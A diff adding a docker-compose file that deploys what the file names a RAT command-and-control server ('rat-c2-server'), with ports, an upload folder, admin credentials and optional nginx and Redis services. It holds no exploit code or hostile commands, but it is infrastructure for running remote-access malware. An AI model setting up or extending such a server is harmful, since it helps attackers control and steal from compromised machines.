@@ -1,0 +1,74 @@
+version: '3.8'
+
+services:
+  c2-server:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    container_name: rat-c2-server
+    restart: unless-stopped
+    ports:
+      - "8080:8080"
+      - "8081:8081"
+    environment:
+      - SECRET_KEY=${SECRET_KEY:-$(openssl rand -hex 32)}
+      - DATABASE=/app/data/c2_server.db
+      - HOST=0.0.0.0
+      - PORT=8080
+      - WS_PORT=8081
+      - DEBUG=false
+      - UPLOAD_FOLDER=/app/uploads
+      - ADMIN_USERNAME=${ADMIN_USERNAME:-admin}
+      - ADMIN_PASSWORD_HASH=${ADMIN_PASSWORD_HASH}
+      - SESSION_TIMEOUT=3600
+      - ENCRYPTION_KEY=${ENCRYPTION_KEY:-$(openssl rand -hex 32)}
+    volumes:
+      - ./data:/app/data
+      - ./uploads:/app/uploads
+      - ./logs:/app/logs
+    healthcheck:
+      test: ["CMD", "python", "-c", "import requests; requests.get('http://localhost:8080/', timeout=5)"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 10s
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "10m"
+        max-file: "3"
+    networks:
+      - rat-network
+
+  # Optional: Reverse proxy with SSL
+  # nginx:
+  #   image: nginx:alpine
+  #   container_name: rat-nginx
+  #   restart: unless-stopped
+  #   ports:
+  #     - "80:80"
+  #     - "443:443"
+  #   volumes:
+  #     - ./nginx.conf:/etc/nginx/nginx.conf:ro
+  #     - ./ssl:/etc/nginx/ssl:ro
+  #   depends_on:
+  #     - c2-server
+  #   networks:
+  #     - rat-network
+
+  # Optional: Redis for session scaling
+  # redis:
+  #   image: redis:7-alpine
+  #   container_name: rat-redis
+  #   restart: unless-stopped
+  #   volumes:
+  #     - redis-data:/data
+  #   networks:
+  #     - rat-network
+
+networks:
+  rat-network:
+    driver: bridge
+
+# volumes:
+#   redis-data:
